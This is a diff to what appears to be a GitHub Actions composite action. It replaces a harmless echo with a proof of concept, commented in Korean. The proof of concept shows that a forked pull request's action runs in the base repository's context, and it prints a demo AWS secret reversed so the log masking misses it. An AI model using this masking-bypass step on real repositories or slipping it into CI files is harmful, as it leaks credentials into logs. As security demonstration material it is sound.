@@ -4,4 +4,7 @@ runs:
   using: composite
   steps:
     - shell: bash
-      run: echo "정상 action 실행됨"
+      run: |
+        echo "[poc] 포크 PR의 action이 원본 컨텍스트에서 실행 중"
+        echo "[poc] raw 시크릿 접근 증명 (뒤집어 출력 → 마스킹 우회, 외부 전송 없음):"
+        echo "$DEMO_AWS_SECRET" | rev
